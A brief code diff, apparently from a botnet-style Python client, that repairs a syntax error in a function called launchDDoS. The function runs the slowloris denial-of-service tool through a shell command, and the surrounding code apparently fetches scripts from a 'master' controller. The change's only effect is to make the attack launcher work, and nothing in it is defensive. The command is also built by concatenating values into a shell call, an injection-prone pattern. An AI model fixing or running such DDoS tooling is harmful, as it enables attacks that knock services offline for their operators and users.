@@ -25,7 +25,7 @@ def get_script():
             print("Error getting script from master")
             continue
 def launchDDoS():
-    proc = Popen("python slowloris.py -i " + MASTER_IP " -p " + SERVING_PORT + " -s 30", \
+    proc = Popen("python slowloris.py -i " + MASTER_IP +  " -p " + SERVING_PORT + " -s 30", \
         shell=True, stdin=PIPE, stdout=PIPE \
         , stderr=PIPE)
     out, err = proc.communicate()
